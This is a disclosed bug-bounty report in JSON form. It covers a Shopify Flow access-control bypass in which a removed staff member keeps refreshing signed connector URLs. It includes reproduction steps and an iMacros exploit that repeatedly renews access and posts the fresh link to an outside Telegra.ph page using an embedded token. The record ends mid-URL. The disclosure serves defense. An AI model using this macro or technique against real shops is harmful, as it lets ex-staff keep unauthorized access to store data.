{
    "id": 698708,
    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82OTg3MDg=",
    "url": "https://hackerone.com/reports/698708",
    "title": "Bypass report #416983 - Removed Staff members who had \"Apps\" permission can still modify flow app connections",
    "state": "Closed",
    "substate": "resolved",
    "severity_rating": "medium",
    "readable_substate": "Resolved",
    "created_at": "2019-09-20T07:36:09.855Z",
    "submitted_at": "2019-09-20T07:36:09.855Z",
    "is_member_of_team?": false,
    "is_organization_group_member?": false,
    "reporter": {
        "disabled": false,
        "username": "mariogh",
        "url": "/mariogh",
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/variants/000/604/582/e011880a1558c75b4d2f45466fa81102f4e71e56_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
        },
        "is_me?": false,
        "cleared": false,
        "verified": false,
        "hackerone_triager": false,
        "hacker_mediation": false
    },
    "team": {
        "id": 1382,
        "url": "https://hackerone.com/shopify",
        "handle": "shopify",
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
            "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "permissions": [],
        "submission_state": "open",
        "default_currency": "usd",
        "awards_miles": false,
        "offers_bounties": true,
        "state": "public_mode",
        "only_cleared_hackers": false,
        "pentest_feature_enabled?": false,
        "profile": {
            "name": "Shopify",
            "twitter_handle": "",
            "website": "https://www.shopify.com",
            "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
        }
    },
    "has_bounty?": true,
    "in_validation?": false,
    "can_view_team": true,
    "can_view_report": true,
    "is_external_bug": false,
    "is_published": false,
    "is_participant": false,
    "has_collaborators": false,
    "submitted_by_team_member": false,
    "stage": 4,
    "public": true,
    "visibility": "full",
    "cve_ids": [],
    "singular_disclosure_disabled": true,
    "disclosed_at": "2019-10-10T21:35:55.375Z",
    "bug_reporter_agreed_on_going_public_at": "2019-10-10T21:35:55.286Z",
    "team_member_agreed_on_going_public_at": "2019-10-10T21:34:44.095Z",
    "comments_closed?": false,
    "facebook_team?": false,
    "team_private?": false,
    "vulnerability_information": "The following report intends to disclose a bypass for #416983.\n\n>It's been found that removed staff members who had \"Apps\" permission can still modify flow app connection settings due to improper authorization.\n\n**Description**\n\nSigned URLs generated by Shopify Flow (https://apps.shopify.com/flow) use a timestamp so it remains valid only during a period of one hour.\n\nAfter that period of time, a removed staff member that previously had Apps permissions should not be able to get unauthorized access to store data, or to connect and disconnect Google Sheets, Trello and Asana accounts from Flow.\n\nWith that said, it's possible for a removed staff member to keep refreshing the `timestamp` and `path_hmac` parameters again and again to get unauthorized access to Flow app connections, forever.\n\nSteps To Reproduce:\n=====================\n1. Login to your shop as the shop owner and add a staff member with only \"Apps\" permission.\n{F587389}\n2. Install flow app: (https://apps.shopify.com/flow)\n3. Login with the new user you added and navigate to `https://[Your-Shop].myshopify.com/admin/apps/flow/connectors`\n{F587390}\n4. Click and connect Google Sheets, Trello and Asana.\n5. With the user you added go to `https://[Your-Shop].myshopify.com/admin/apps/flow/connectors`, click `Google Sheets` and you will be redirected to:\n{F587391}\n**Jorge Perez Hilton** is my personal Google Account, I link it to the store to create this report. You can verify this by sending me an email to perezhiltontester@gmail.com. \n6. Grab the URL you are visiting. It will look like `https://flow-connectors.shopifycloud.com/gsheet/connect?shop_domain=victim-store-mariogh.myshopify.com&shop_id=10361503766&timestamp=[TIMESTAMP]&path_hmac=[PATH_HMAC]`.\n7. Login with the shop owner and remove the user you added\n8. You can now use the links you saved to modify connectors settings for 60 minutes even if you are not a Staff member anymore. To reset the timestamp, go to the link you grabbed before the 60 minutes time-frame ends and disconnect the Google Account by clicking `Disconnect`. You will see now something like:\n{F587394}\n9. Now, click on `Connect` and use any Google Account. The account will successfully connect, a new `timestamp` and a new `path_hmac` will be generated, and they will give you unauthorized access to Flow connectors for an extra 60 mins. \n10. Save the updated URL and repeat the *step 8* and *step 9* every ~45 min. This can be done manually or by automating the browser actions.\n\nI tried to login with the Admin account, Disconnect and Reconnect a new Google Account, thinking that after a new `timestamp` and a new `path_hmac` is generated, the hacker's URL and `path_hmac` will be \"blocked\" but it doesn't work this way.\n\nWhen the Admin generates a new `timestamp` and a new `path_hmac`, is like \"both URL's are valid to get access\". The hacker's (which is a removed staff member) URL still allows him to get unauthorized access to Flow app connections and to refresh the `timestamp` and `path_hmac` again and again.\n\n## Impact\n\nThrough this vulnerability a removed staff member will be able to modify google spread sheet, trello and asana connections to connect his own accounts so that workflow actions regarding the connections go to his accounts and therefore he can still access the shop data.",
    "weakness": {
        "id": 26,
        "name": "Improper Access Control - Generic"
    },
    "original_report_id": null,
    "original_report_url": null,
    "attachments": [
        {
            "id": 587389,
            "file_name": "Screenshot_from_2019-09-20_01-50-11.png",
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/8qKNFZ37djMG5QZAsi9kDhNk?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2019-09-20_01-50-11.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2019-09-20_01-50-11.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYY3KUHY6%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T073010Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDbZ%2FrzMJPkXzqJKGhUDJxaKvRKOwgW3L9NoGgTQYNluwIgP%2FQUNBim5xYJkBE4bibyDr4jMY%2FqMgU8yTBdR9QfoSQquwUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDDEZLUDtzsol34pf1yqPBZq6rwka9dcUmP1Z24HNrPUaSjikKtPCd8tWm8aqp4p6845zp81qitLzXk9PwD9slj3c%2BSQSWjztZWIJEXZWIIlCQ8zW3V0YeF%2BPbkNoqrw1iHYiPAXC3t9y2cnp7uesZte%2B5t1Hb%2BbmTSUMQfTPsazLeu4nH%2F9MWkcvLY34rjH54kSRBSKoSpNPgPj2kSMe0Agn9jQ102utMKoMlhVvvqtnQmOO3yY83c9MPBbCmAsuXLoVvwRyAURznumXGaAY8T%2B16canJngAP7ML%2BGxqR9a4ioL%2FIEyZSARvH%2BOf1TL1KtnyqLRmKVMht7VNGhWu30mxL%2BAZvsBaOHSbngtEExTFVCGCjgA2bXH0nM7V4nVzgSBjnCm4xHKwlKw2UGiCKE1jyfYLNBgBnjuBeFtvw%2FIXEVAwP1X%2BGxr%2BBJEndKkov5kap4UxeFIHzwNu%2BuncV7Htjx%2B5Ceg3lS1dVXtigyLqfWS9ZDcUOzUU8a%2Bc2xMZW9%2FDGUXGEivZ6wchu7US3C7TYxKEqYefV4bC7u%2BQO8geofYjAWDWujYfUQPfe2CWBUQKd0IbyyY8dVsRqXxXquWP2PWT6zzBxgu8QOuklVxDBrNLKbnQ5Xm9tuf3xELeqIHfe%2BGfDIpigjAR4iago3Vsz8V7gdnhQUBe4ae8zi26qOx8xVbJBK3TtN9dyjtmyAO%2BWWqtf2WMN8S7GtgDCOEzmPtLc6hxX9Olifu0uGtBRSb0zE0EOX16pUQ7%2FFcPTQsSLqJC4c33cv%2BYTmjfyDDgUNUS4WbOmU0UwWv4bnaXCRIk8v9ZvvpaPfvZC1lx6k6alXR4GMigA2XBEFD852wBKdWpfiKe%2B4KEwnLNAeKE4xXaAmclAQBS8jFTLsYwsJ62pwY6sQHyCoWizkYjoXsyfeuh51YDF9e38C97iPYDjIXpJSSm1TTtLU%2FTGWnKeQisJw%2FcC8RKX7KKsFxYNATPCKUXKb05GVgEvZvvRtb71Ou3fUQO2phoABIv%2FguN%2BQLZIk23gYhvoCnzlJyh%2Bs4YT4Y9NBe%2BuO50gRcLkId0hIDo3s3rVFEHd3DeobVXe7TJmQ%2FoPHXywJmCBc5i%2FnGGtc8UW4nb1QByAu4MMgRtTUGscF6wF9Q%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=edac21058b703fca986a5a81e994fb4678e1fac87e5f8d822fafd802fc17b650",
            "file_size": 133453,
            "type": "image/png"
        },
        {
            "id": 587390,
            "file_name": "Screenshot_from_2019-09-20_01-53-04.png",
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/LR6qshVuyUjAprYgVKXq9yHd?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2019-09-20_01-53-04.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2019-09-20_01-53-04.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYY3KUHY6%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T073010Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDbZ%2FrzMJPkXzqJKGhUDJxaKvRKOwgW3L9NoGgTQYNluwIgP%2FQUNBim5xYJkBE4bibyDr4jMY%2FqMgU8yTBdR9QfoSQquwUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDDEZLUDtzsol34pf1yqPBZq6rwka9dcUmP1Z24HNrPUaSjikKtPCd8tWm8aqp4p6845zp81qitLzXk9PwD9slj3c%2BSQSWjztZWIJEXZWIIlCQ8zW3V0YeF%2BPbkNoqrw1iHYiPAXC3t9y2cnp7uesZte%2B5t1Hb%2BbmTSUMQfTPsazLeu4nH%2F9MWkcvLY34rjH54kSRBSKoSpNPgPj2kSMe0Agn9jQ102utMKoMlhVvvqtnQmOO3yY83c9MPBbCmAsuXLoVvwRyAURznumXGaAY8T%2B16canJngAP7ML%2BGxqR9a4ioL%2FIEyZSARvH%2BOf1TL1KtnyqLRmKVMht7VNGhWu30mxL%2BAZvsBaOHSbngtEExTFVCGCjgA2bXH0nM7V4nVzgSBjnCm4xHKwlKw2UGiCKE1jyfYLNBgBnjuBeFtvw%2FIXEVAwP1X%2BGxr%2BBJEndKkov5kap4UxeFIHzwNu%2BuncV7Htjx%2B5Ceg3lS1dVXtigyLqfWS9ZDcUOzUU8a%2Bc2xMZW9%2FDGUXGEivZ6wchu7US3C7TYxKEqYefV4bC7u%2BQO8geofYjAWDWujYfUQPfe2CWBUQKd0IbyyY8dVsRqXxXquWP2PWT6zzBxgu8QOuklVxDBrNLKbnQ5Xm9tuf3xELeqIHfe%2BGfDIpigjAR4iago3Vsz8V7gdnhQUBe4ae8zi26qOx8xVbJBK3TtN9dyjtmyAO%2BWWqtf2WMN8S7GtgDCOEzmPtLc6hxX9Olifu0uGtBRSb0zE0EOX16pUQ7%2FFcPTQsSLqJC4c33cv%2BYTmjfyDDgUNUS4WbOmU0UwWv4bnaXCRIk8v9ZvvpaPfvZC1lx6k6alXR4GMigA2XBEFD852wBKdWpfiKe%2B4KEwnLNAeKE4xXaAmclAQBS8jFTLsYwsJ62pwY6sQHyCoWizkYjoXsyfeuh51YDF9e38C97iPYDjIXpJSSm1TTtLU%2FTGWnKeQisJw%2FcC8RKX7KKsFxYNATPCKUXKb05GVgEvZvvRtb71Ou3fUQO2phoABIv%2FguN%2BQLZIk23gYhvoCnzlJyh%2Bs4YT4Y9NBe%2BuO50gRcLkId0hIDo3s3rVFEHd3DeobVXe7TJmQ%2FoPHXywJmCBc5i%2FnGGtc8UW4nb1QByAu4MMgRtTUGscF6wF9Q%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=db6eadd4af2089e9c9214c928582cafc29fa564bab8e4ace93ab44c23d1380b7",
            "file_size": 125480,
            "type": "image/png"
        },
        {
            "id": 587391,
            "file_name": "Screenshot_from_2019-09-20_01-57-20.png",
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/j1hbMYN8ZBwc4KFY2xkUkEED?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2019-09-20_01-57-20.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2019-09-20_01-57-20.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYY3KUHY6%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T073010Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDbZ%2FrzMJPkXzqJKGhUDJxaKvRKOwgW3L9NoGgTQYNluwIgP%2FQUNBim5xYJkBE4bibyDr4jMY%2FqMgU8yTBdR9QfoSQquwUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDDEZLUDtzsol34pf1yqPBZq6rwka9dcUmP1Z24HNrPUaSjikKtPCd8tWm8aqp4p6845zp81qitLzXk9PwD9slj3c%2BSQSWjztZWIJEXZWIIlCQ8zW3V0YeF%2BPbkNoqrw1iHYiPAXC3t9y2cnp7uesZte%2B5t1Hb%2BbmTSUMQfTPsazLeu4nH%2F9MWkcvLY34rjH54kSRBSKoSpNPgPj2kSMe0Agn9jQ102utMKoMlhVvvqtnQmOO3yY83c9MPBbCmAsuXLoVvwRyAURznumXGaAY8T%2B16canJngAP7ML%2BGxqR9a4ioL%2FIEyZSARvH%2BOf1TL1KtnyqLRmKVMht7VNGhWu30mxL%2BAZvsBaOHSbngtEExTFVCGCjgA2bXH0nM7V4nVzgSBjnCm4xHKwlKw2UGiCKE1jyfYLNBgBnjuBeFtvw%2FIXEVAwP1X%2BGxr%2BBJEndKkov5kap4UxeFIHzwNu%2BuncV7Htjx%2B5Ceg3lS1dVXtigyLqfWS9ZDcUOzUU8a%2Bc2xMZW9%2FDGUXGEivZ6wchu7US3C7TYxKEqYefV4bC7u%2BQO8geofYjAWDWujYfUQPfe2CWBUQKd0IbyyY8dVsRqXxXquWP2PWT6zzBxgu8QOuklVxDBrNLKbnQ5Xm9tuf3xELeqIHfe%2BGfDIpigjAR4iago3Vsz8V7gdnhQUBe4ae8zi26qOx8xVbJBK3TtN9dyjtmyAO%2BWWqtf2WMN8S7GtgDCOEzmPtLc6hxX9Olifu0uGtBRSb0zE0EOX16pUQ7%2FFcPTQsSLqJC4c33cv%2BYTmjfyDDgUNUS4WbOmU0UwWv4bnaXCRIk8v9ZvvpaPfvZC1lx6k6alXR4GMigA2XBEFD852wBKdWpfiKe%2B4KEwnLNAeKE4xXaAmclAQBS8jFTLsYwsJ62pwY6sQHyCoWizkYjoXsyfeuh51YDF9e38C97iPYDjIXpJSSm1TTtLU%2FTGWnKeQisJw%2FcC8RKX7KKsFxYNATPCKUXKb05GVgEvZvvRtb71Ou3fUQO2phoABIv%2FguN%2BQLZIk23gYhvoCnzlJyh%2Bs4YT4Y9NBe%2BuO50gRcLkId0hIDo3s3rVFEHd3DeobVXe7TJmQ%2FoPHXywJmCBc5i%2FnGGtc8UW4nb1QByAu4MMgRtTUGscF6wF9Q%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7fd2182f11434b4bce801434c041734bdd3a9689aef1a651399ae7546d23b803",
            "file_size": 78724,
            "type": "image/png"
        },
        {
            "id": 587394,
            "file_name": "Screenshot_from_2019-09-20_02-05-38.png",
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/zVCJjefRpXGfsMrk2EB7ScgD?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2019-09-20_02-05-38.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2019-09-20_02-05-38.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYY3KUHY6%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T073010Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDbZ%2FrzMJPkXzqJKGhUDJxaKvRKOwgW3L9NoGgTQYNluwIgP%2FQUNBim5xYJkBE4bibyDr4jMY%2FqMgU8yTBdR9QfoSQquwUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDDEZLUDtzsol34pf1yqPBZq6rwka9dcUmP1Z24HNrPUaSjikKtPCd8tWm8aqp4p6845zp81qitLzXk9PwD9slj3c%2BSQSWjztZWIJEXZWIIlCQ8zW3V0YeF%2BPbkNoqrw1iHYiPAXC3t9y2cnp7uesZte%2B5t1Hb%2BbmTSUMQfTPsazLeu4nH%2F9MWkcvLY34rjH54kSRBSKoSpNPgPj2kSMe0Agn9jQ102utMKoMlhVvvqtnQmOO3yY83c9MPBbCmAsuXLoVvwRyAURznumXGaAY8T%2B16canJngAP7ML%2BGxqR9a4ioL%2FIEyZSARvH%2BOf1TL1KtnyqLRmKVMht7VNGhWu30mxL%2BAZvsBaOHSbngtEExTFVCGCjgA2bXH0nM7V4nVzgSBjnCm4xHKwlKw2UGiCKE1jyfYLNBgBnjuBeFtvw%2FIXEVAwP1X%2BGxr%2BBJEndKkov5kap4UxeFIHzwNu%2BuncV7Htjx%2B5Ceg3lS1dVXtigyLqfWS9ZDcUOzUU8a%2Bc2xMZW9%2FDGUXGEivZ6wchu7US3C7TYxKEqYefV4bC7u%2BQO8geofYjAWDWujYfUQPfe2CWBUQKd0IbyyY8dVsRqXxXquWP2PWT6zzBxgu8QOuklVxDBrNLKbnQ5Xm9tuf3xELeqIHfe%2BGfDIpigjAR4iago3Vsz8V7gdnhQUBe4ae8zi26qOx8xVbJBK3TtN9dyjtmyAO%2BWWqtf2WMN8S7GtgDCOEzmPtLc6hxX9Olifu0uGtBRSb0zE0EOX16pUQ7%2FFcPTQsSLqJC4c33cv%2BYTmjfyDDgUNUS4WbOmU0UwWv4bnaXCRIk8v9ZvvpaPfvZC1lx6k6alXR4GMigA2XBEFD852wBKdWpfiKe%2B4KEwnLNAeKE4xXaAmclAQBS8jFTLsYwsJ62pwY6sQHyCoWizkYjoXsyfeuh51YDF9e38C97iPYDjIXpJSSm1TTtLU%2FTGWnKeQisJw%2FcC8RKX7KKsFxYNATPCKUXKb05GVgEvZvvRtb71Ou3fUQO2phoABIv%2FguN%2BQLZIk23gYhvoCnzlJyh%2Bs4YT4Y9NBe%2BuO50gRcLkId0hIDo3s3rVFEHd3DeobVXe7TJmQ%2FoPHXywJmCBc5i%2FnGGtc8UW4nb1QByAu4MMgRtTUGscF6wF9Q%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=99da71020d84f6f1c2b44d0b7fcc14ff16a2cf663bd947a63fb761513f579431",
            "file_size": 80806,
            "type": "image/png"
        }
    ],
    "allow_singular_disclosure_at": null,
    "vote_count": 24,
    "voters": [
        "drsniper",
        "p1stachios",
        "sameerphad72",
        "remonsec",
        "ali",
        "tulswani",
        "geeknik",
        "kunal94",
        "naategh",
        "h13-",
        "and 14 more..."
    ],
    "severity": {
        "rating": "medium",
        "author_type": "User"
    },
    "structured_scope": {
        "databaseId": 37198,
        "asset_type": "OTHER",
        "asset_identifier": "Shopify Developed Apps",
        "max_severity": "medium"
    },
    "abilities": {
        "assignable_team_members": [],
        "assignable_team_member_groups": []
    },
    "activities": [
        {
            "id": 5865852,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "I keep playing around. \n\nI developed an exploit for this, so there is no need to manually refreshing the `timestamp` and `path_hmac`. You just run the exploit and you will have unauthorized access to the flow app connection settings, forever.\n\nI hope it helps as well to provide more clarity about how the bug works.\n\nThe Exploit\n=====================\n\n**What it does**: Automatically updates a Telegra.ph page owned by the ex-employee  (https://telegra.ph/Realtime-Updated-URL-to-Access-Flow-Connectors-09-23) to always display a fresh link that will allow him to get unauthorized access to the flow app connection settings of the store he was deleted from.\n\nThe attacker can check his Telegra.ph page at any time, any hour, and will always have a fresh and valid link.\n\n{F589444}\n\n**How the exploit works**: I created a Macro, using the iMacros extension for Firefox (https://addons.mozilla.org/en-US/firefox/addon/imacros-for-firefox/) that will automatically refresh your `timestamp` and `path_hmac` every 30 minutes.\n\n{F589458} \n\nYou need a Firefox instance open just for this. No worries, you can browse the web with Chrome or any other browser.\n\nThe code of the macro is:\n```\nVERSION BUILD=10021450\nSET !LOOP 100\nTAG POS=2 TYPE=SPAN ATTR=TXT:Disconnect\nWAIT SECONDS=10\nTAG POS=2 TYPE=SPAN ATTR=TXT:Connect\nWAIT SECONDS=10\nTAG POS=1 TYPE=DIV ATTR=TXT:Jorge<SP>Perez<SP>Hilton\nWAIT SECONDS=10\nTAG POS=2 TYPE=SPAN ATTR=TXT:Permitir\nWAIT SECONDS=10\nSET !VAR1 EVAL(\"var HttpR = new XMLHttpRequest();var urlQ=\\\"https://api.telegra.ph/editPage/Realtime-Updated-URL-to-Access-Flow-Connectors-09-23?access_token=3929aa6b0e9a7d6653a7f40a0e7d8dacd1532125289a16b8949306d11b66&title=Realtime+Updated+URL+to+Access+Flow+Connectors&author_name=ex-employee+and+a+very+bad+guy.&content=[{%22tag%22:%22p%22,%22children%22:[%22\\\"+encodeURIComponent(window.location.href)+\\\"%22]}]&return_content=true\\\";HttpR.open(\\\"GET\\\", urlQ);HttpR.send();\")\nWAIT SECONDS=1760\n```\nIt uses the Telegra.ph API to keep edit your page and keep it updated with the fresh link. Due to some limits in the Free Version of iMacro, we can only do 100 loops, that means, that our exploit will be running for 2 days (and some hours) before he stops. So you just have to click \"STOP\" and \"PLAY\" every morning, when you wake up, to keep the macro running forever.\n\n\nLink to POC\n=====================\n\nYou can click here (https://telegra.ph/Realtime-Updated-URL-to-Access-Flow-Connectors-09-23) and copy an up to date link, to get access to my flow app connections.\n\n(Example of how it looks)\n{F589460}",
            "automated_response": false,
            "created_at": "2019-09-23T06:37:34.578Z",
            "updated_at": "2019-09-23T06:37:34.578Z",
            "actor": {
                "username": "mariogh",
                "cleared": false,
                "verified": false,
                "url": "/mariogh",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/604/582/e011880a1558c75b4d2f45466fa81102f4e71e56_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "attachments": [
                {
                    "id": 589460,
                    "filename": "Screenshot_from_2019-09-23_01-32-10.png",
                    "type": "image/png",
                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/YHa2875qLaNFgwEoWj48XAEP?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2019-09-23_01-32-10.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2019-09-23_01-32-10.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYY3KUHY6%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T073010Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDbZ%2FrzMJPkXzqJKGhUDJxaKvRKOwgW3L9NoGgTQYNluwIgP%2FQUNBim5xYJkBE4bibyDr4jMY%2FqMgU8yTBdR9QfoSQquwUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDDEZLUDtzsol34pf1yqPBZq6rwka9dcUmP1Z24HNrPUaSjikKtPCd8tWm8aqp4p6845zp81qitLzXk9PwD9slj3c%2BSQSWjztZWIJEXZWIIlCQ8zW3V0YeF%2BPbkNoqrw1iHYiPAXC3t9y2cnp7uesZte%2B5t1Hb%2BbmTSUMQfTPsazLeu4nH%2F9MWkcvLY34rjH54kSRBSKoSpNPgPj2kSMe0Agn9jQ102utMKoMlhVvvqtnQmOO3yY83c9MPBbCmAsuXLoVvwRyAURznumXGaAY8T%2B16canJngAP7ML%2BGxqR9a4ioL%2FIEyZSARvH%2BOf1TL1KtnyqLRmKVMht7VNGhWu30mxL%2BAZvsBaOHSbngtEExTFVCGCjgA2bXH0nM7V4nVzgSBjnCm4xHKwlKw2UGiCKE1jyfYLNBgBnjuBeFtvw%2FIXEVAwP1X%2BGxr%2BBJEndKkov5kap4UxeFIHzwNu%2BuncV7Htjx%2B5Ceg3lS1dVXtigyLqfWS9ZDcUOzUU8a%2Bc2xMZW9%2FDGUXGEivZ6wchu7US3C7TYxKEqYefV4bC7u%2BQO8geofYjAWDWujYfUQPfe2CWBUQKd0IbyyY8dVsRqXxXquWP2PWT6zzBxgu8QOuklVxDBrNLKbnQ5Xm9tuf3xELeqIHfe%2BGfDIpigjAR4iago3Vsz8V7gdnhQUBe4ae8zi26qOx8xVbJBK3TtN9dyjtmyAO%2BWWqtf2WMN8S7GtgDCOEzmPtLc6hxX9Olifu0uGtBRSb0zE0EOX16pUQ7%2FFcPTQsSLqJC4c33cv%2BYTmjfyDDgUNUS4WbOmU0UwWv4bnaXCRIk8v9ZvvpaPfvZC1lx6k6alXR4GMigA2XBEFD852wBKdWpfiKe%2B4KEwnLNAeKE4xXaAmclAQBS8jFTLsYwsJ62pwY6sQHyCoWizkYjoXsyfeuh51YDF9e38C97iPYDjIXpJSSm1TTtLU%2FTGWnKeQisJw%2FcC8RKX7KKsFxYNATPCKUXKb05GVgEvZvvRtb71Ou3fUQO2phoABIv%2FguN%2BQLZIk23gYhvoCnzlJyh%2Bs4YT4Y9NBe%2BuO50gRcLkId0hIDo3s3rVFEHd3DeobVXe7TJmQ%2FoPHXywJmCBc5i%2FnGGtc8UW4nb1QByAu4MMgRtTUGscF6wF9Q%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1071204b1db20e6930d99706a49ff9155d2d9b7b483be7e3c32e280a4a2ff69d"
                },
                {
                    "id": 589458,
                    "filename": "Screenshot_from_2019-09-23_01-31-20.png",
                    "type": "image/png",
                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/CF7MR3bNqv7D5VV7QXNEdGyz?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2019-09-23_01-31-20.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2019-09-23_01-31-20.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYY3KUHY6%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T073010Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDbZ%2FrzMJPkXzqJKGhUDJxaKvRKOwgW3L9NoGgTQYNluwIgP%2FQUNBim5xYJkBE4bibyDr4jMY%2FqMgU8yTBdR9QfoSQquwUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDDEZLUDtzsol34pf1yqPBZq6rwka9dcUmP1Z24HNrPUaSjikKtPCd8tWm8aqp4p6845zp81qitLzXk9PwD9slj3c%2BSQSWjztZWIJEXZWIIlCQ8zW3V0YeF%2BPbkNoqrw1iHYiPAXC3t9y2cnp7uesZte%2B5t1Hb%2BbmTSUMQfTPsazLeu4nH%2F9MWkcvLY34rjH54kSRBSKoSpNPgPj2kSMe0Agn9jQ102utMKoMlhVvvqtnQmOO3yY83c9MPBbCmAsuXLoVvwRyAURznumXGaAY8T%2B16canJngAP7ML%2BGxqR9a4ioL%2FIEyZSARvH%2BOf1TL1KtnyqLRmKVMht7VNGhWu30mxL%2BAZvsBaOHSbngtEExTFVCGCjgA2bXH0nM7V4nVzgSBjnCm4xHKwlKw2UGiCKE1jyfYLNBgBnjuBeFtvw%2FIXEVAwP1X%2BGxr%2BBJEndKkov5kap4UxeFIHzwNu%2BuncV7Htjx%2B5Ceg3lS1dVXtigyLqfWS9ZDcUOzUU8a%2Bc2xMZW9%2FDGUXGEivZ6wchu7US3C7TYxKEqYefV4bC7u%2BQO8geofYjAWDWujYfUQPfe2CWBUQKd0IbyyY8dVsRqXxXquWP2PWT6zzBxgu8QOuklVxDBrNLKbnQ5Xm9tuf3xELeqIHfe%2BGfDIpigjAR4iago3Vsz8V7gdnhQUBe4ae8zi26qOx8xVbJBK3TtN9dyjtmyAO%2BWWqtf2WMN8S7GtgDCOEzmPtLc6hxX9Olifu0uGtBRSb0zE0EOX16pUQ7%2FFcPTQsSLqJC4c33cv%2BYTmjfyDDgUNUS4WbOmU0UwWv4bnaXCRIk8v9ZvvpaPfvZC1lx6k6alXR4GMigA2XBEFD852wBKdWpfiKe%2B4KEwnLNAeKE4xXaAmclAQBS8jFTLsYwsJ62pwY6sQHyCoWizkYjoXsyfeuh51YDF9e38C97iPYDjIXpJSSm1TTtLU%2FTGWnKeQisJw%2FcC8RKX7KKsFxYNATPCKUXKb05GVgEvZvvRtb71Ou3fUQO2phoABIv%2FguN%2BQ